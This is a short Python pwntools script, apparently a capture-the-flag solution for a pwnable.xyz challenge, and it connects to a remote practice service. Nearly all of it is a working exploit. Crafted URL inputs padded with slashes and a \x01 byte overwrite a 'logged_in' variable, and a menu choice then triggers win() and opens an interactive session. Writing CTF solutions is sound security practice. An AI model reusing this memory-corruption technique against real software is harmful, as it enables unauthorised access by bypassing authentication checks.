from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30021)

sla = r.sendlineafter
sa = r.sendafter

def create_url(protocol, size, domain):
    sla('> ', '2')
    sa('Secure or insecure: ', protocol)
    sla('Size of url: ', str(size))
    r.send(domain)


# overwrite logged_in

create_url('http/////', 0x7f, '/' * 0x7f)
create_url('http/////', 0x7f, '/' * 0x7f)
create_url('http/////', 0x2, '/' + '\x01')


# call win()

sla('> ', '4')


r.interactive()